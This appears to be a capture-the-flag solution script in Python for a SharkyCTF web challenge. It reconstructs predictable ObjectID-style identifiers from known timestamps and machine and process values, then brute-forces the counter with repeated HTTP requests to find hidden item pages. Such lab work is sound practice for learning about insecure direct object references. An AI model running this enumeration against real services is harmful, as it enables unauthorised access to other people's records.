import requests

url = "http://containment-forever.sharkyctf.xyz/item/"

t1 = "5e75dab2"
t2 = "5e948a3a"
mid = "d7b160"
pid = "0013"
c = 0x655bb5

for i in range(200):
    offset = hex(c+i)[2:]

    p = requests.get(url + t1 + mid + pid + offset)
    if p.ok:
        print(url + t1 + mid + pid + offset)
        break


for i in range(200):
    offset = hex(c+i)[2:]

    p = requests.get(url + t2 + mid + pid + offset)
    if p.ok:
        print(url + t2 + mid + pid + offset)
        break
